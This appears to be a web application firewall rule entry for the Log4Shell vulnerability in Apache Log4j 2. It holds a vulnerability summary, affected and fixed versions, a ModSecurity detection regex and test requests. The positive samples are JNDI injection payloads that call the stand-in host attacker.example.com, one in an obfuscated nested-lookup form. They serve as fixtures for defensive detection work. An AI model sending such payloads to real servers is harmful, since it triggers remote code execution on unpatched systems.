{
  "id": "ivp-2021-44228",
  "example": true,
  "cves": [
    "CVE-2021-44228",
    "CVE-2021-45046"
  ],
  "title": "Apache Log4j JNDI lookup injection (Log4Shell)",
  "summary": "Apache Log4j 2 evaluates ${...} lookups in the strings it logs. A request that gets a string such as ${jndi:ldap://attacker.example.com/a} logged makes the server fetch and run code from the attacker's LDAP or RMI server. The rule matches lookup syntax in the request line, the query and form arguments and their names, cookies and headers: a lookup naming jndi, a lookup nested in another one (used to hide the word jndi, as in ${${lower:j}ndi:...}), and the HTML entity spellings of $ and {.",
  "affected": [
    {
      "product": "Apache Log4j 2 (log4j-core)",
      "versions": "2.0-beta9 to 2.15.0, except 2.12.2 and 2.3.1",
      "fixed": "2.16.0 (Java 8), 2.12.2 (Java 7), 2.3.1 (Java 6)"
    }
  ],
  "severity": "critical",
  "publishedAt": "2021-12-10T00:00:00Z",
  "updatedAt": "2021-12-14T00:00:00Z",
  "references": [
    "https://nvd.nist.gov/vuln/detail/CVE-2021-44228",
    "https://nvd.nist.gov/vuln/detail/CVE-2021-45046",
    "https://logging.apache.org/log4j/2.x/security.html"
  ],
  "defaultMode": "block",
  "rules": [
    "SecRule REQUEST_LINE|ARGS|ARGS_NAMES|REQUEST_COOKIES|REQUEST_COOKIES_NAMES|REQUEST_HEADERS \"@rx (?i)(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)(?:[^}]{0,15}(?:\\$|&dollar;?)(?:\\{|&l(?:brace|cub);?)|jndi)\" \"id:1800000101,phase:2,t:none,t:urlDecodeUni\""
  ],
  "samples": {
    "positive": [
      {
        "method": "GET",
        "path": "/?q=%24%7Bjndi%3Aldap%3A%2F%2Fattacker.example.com%2Fa%7D"
      },
      {
        "method": "GET",
        "path": "/",
        "headers": {
          "X-Api-Version": "${jndi:ldap://attacker.example.com/a}"
        }
      },
      {
        "method": "GET",
        "path": "/",
        "headers": {
          "User-Agent": "${${lower:j}ndi:ldap://attacker.example.com/a}"
        }
      }
    ],
    "negative": [
      {
        "method": "GET",
        "path": "/search?q=price%20%24%7B10%7D"
      },
      {
        "method": "GET",
        "path": "/",
        "headers": {
          "User-Agent": "Mozilla/5.0 (X11; Linux x86_64)"
        }
      }
    ]
  }
}
